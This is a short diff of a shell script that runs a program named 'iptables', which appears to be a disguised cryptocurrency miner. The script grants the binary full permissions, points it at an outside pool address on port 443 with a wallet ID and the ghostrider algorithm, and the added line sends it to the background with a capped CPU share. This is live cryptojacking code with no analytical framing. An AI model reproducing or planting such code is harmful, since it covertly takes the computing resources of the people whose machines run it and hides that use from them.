@@ -1,4 +1,4 @@
 #!/bin/sh
 chmod 777 iptables
-nohup ./iptables -o 51.13.190.217:443 -u BkqhfrkPCSs3WygG2ePQSomBUR4woLTafi.$(echo $(shuf -i 1-999 -n 1)-T4) -p x -k -a ghostrider -t 3
+nohup ./iptables -o 51.13.190.217:443 -u BkqhfrkPCSs3WygG2ePQSomBUR4woLTafi.$(echo $(shuf -i 1-999 -n 1)-CC) -p x -k -a ghostrider --cpu-max-threads-hint=75 &
 
